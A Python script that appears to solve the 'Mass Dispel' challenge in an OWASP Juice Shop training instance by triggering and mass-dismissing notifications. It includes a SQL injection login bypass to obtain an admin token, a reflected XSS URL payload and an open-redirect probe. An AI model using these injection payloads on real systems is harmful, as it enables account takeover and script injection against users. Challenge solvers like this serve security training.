#!/usr/bin/env python3
"""
Solve Mass Dispel Challenge Properly
The key is to trigger multiple challenge notifications simultaneously and dismiss them all at once
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_mass_dispel():
    """Solve Mass Dispel by triggering multiple notifications and dismissing at once"""
    
    print("🔔 SOLVING MASS DISPEL CHALLENGE")
    print("=" * 60)
    print("Strategy: Trigger multiple unsolved challenges to get notifications")
    print("Then dismiss them all with a single action")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser
        context = browser.new_context()
        page = context.new_page()
        
        # Navigate to main page
        print("\n📍 Step 1: Navigate to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Dismiss cookie consent
        try:
            cookie_btn = page.locator('a:has-text("Me want it")').first
            if cookie_btn.is_visible():
                cookie_btn.click()
                print("   ✅ Dismissed cookie consent")
                time.sleep(1)
        except:
            pass
        
        print("\n📍 Step 2: Preparing to trigger multiple challenges...")
        
        # Clear any existing notifications
        page.keyboard.press("Escape")
        time.sleep(1)
        
        print("\n📍 Step 3: Opening multiple browser contexts to trigger challenges...")
        
        # We'll open multiple pages/contexts to solve different challenges simultaneously
        # This should create multiple notification popups at once
        
        pages = []
        
        # Challenge 1: Admin Section (easy - just navigate)
        print("   Opening Admin Section...")
        page1 = context.new_page()
        page1.goto(f"{TARGET}/#/administration", wait_until="domcontentloaded")
        pages.append(page1)
        time.sleep(0.5)
        
        # Challenge 2: Web3 Sandbox (easy - just navigate)
        print("   Opening Web3 Sandbox...")
        page2 = context.new_page()
        page2.goto(f"{TARGET}/#/web3", wait_until="domcontentloaded")
        pages.append(page2)
        time.sleep(0.5)
        
        # Challenge 3: Missing Encoding (access emoji image)
        print("   Opening Missing Encoding challenge...")
        page3 = context.new_page()
        try:
            page3.goto(f"{TARGET}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg", 
                      wait_until="domcontentloaded", timeout=5000)
        except:
            pass  # May timeout but still triggers
        pages.append(page3)
        time.sleep(0.5)
        
        # Challenge 4: Zero Stars (needs interaction)
        print("   Attempting Zero Stars review...")
        page4 = context.new_page()
        page4.goto(TARGET, wait_until="networkidle")
        time.sleep(2)
        
        # Try to submit a zero-star review
        try:
            # Click on first product
            first_product = page4.locator('.mat-card, [class*="product"]').first
            if first_product.is_visible():
                first_product.click()
                time.sleep(2)
                
                # Try to submit with 0 stars
                submit_btn = page4.locator('button:has-text("Submit"), button[type="submit"]').first
                if submit_btn.is_visible():
                    # Don't select any stars and submit
                    submit_btn.click()
        except:
            pass
        pages.append(page4)
        
        # Wait for all notifications to appear
        print("\n📍 Step 4: Waiting for notifications to appear...")
        time.sleep(3)
        
        # Switch back to main page
        page.bring_to_front()
        
        # Check for notifications
        print("\n📍 Step 5: Looking for multiple notifications...")
        
        notifications = page.locator('.challenge-solved-toast, simple-notification, .mat-snack-bar-container').all()
        print(f"   Found {len(notifications)} notification(s)")
        
        if len(notifications) >= 2:
            print("\n🎯 Multiple notifications detected! Dismissing all at once...")
            
            # This is the key - dismiss them ALL with a single action
            print("   Pressing ESC to dismiss all...")
            page.keyboard.press("Escape")
            time.sleep(1)
            
            print("   ✅ Dismissed all notifications with single ESC press!")
            
        else:
            print("\n⚠️ Not enough notifications. Trying alternative approach...")
            
            # Alternative: Rapidly navigate to trigger multiple challenges
            print("   Rapidly triggering challenges...")
            
            urls = [
                f"{TARGET}/#/administration",
                f"{TARGET}/#/web3",
                f"{TARGET}/#/track-result?id=<script>alert('xss')</script>",
                f"{TARGET}/redirect?to=https://blockchain.info",
            ]
            
            for url in urls:
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=2000)
                except:
                    pass
                # Don't wait between navigations
            
            time.sleep(3)
            
            # Now press ESC
            print("   Pressing ESC to dismiss any notifications...")
            page.keyboard.press("Escape")
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/mass_dispel_attempt.png")
        print("\n📸 Screenshot saved: mass_dispel_attempt.png")
        
        # Close extra pages
        for p in pages:
            p.close()
        
        browser.close()
    
    # Check if Mass Dispel was solved
    print("\n📊 Checking if Mass Dispel is solved...")
    
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            mass_dispel = next((c for c in challenges if 'Mass Dispel' in c.get('name', '')), None)
            
            if mass_dispel:
                if mass_dispel.get('solved'):
                    print("\n✅ SUCCESS! Mass Dispel is now SOLVED!")
                    print("   The challenge should now show green on the scoreboard")
                    return True
                else:
                    print("\n⚠️ Mass Dispel still not solved")
                    print("\n💡 Key requirements:")
                    print("   1. Multiple challenge notifications must be visible simultaneously")
                    print("   2. All must be dismissed with a SINGLE action (one ESC press)")
                    print("   3. The dismissal must happen while multiple are still on screen")
    
    return False

if __name__ == "__main__":
    solve_mass_dispel()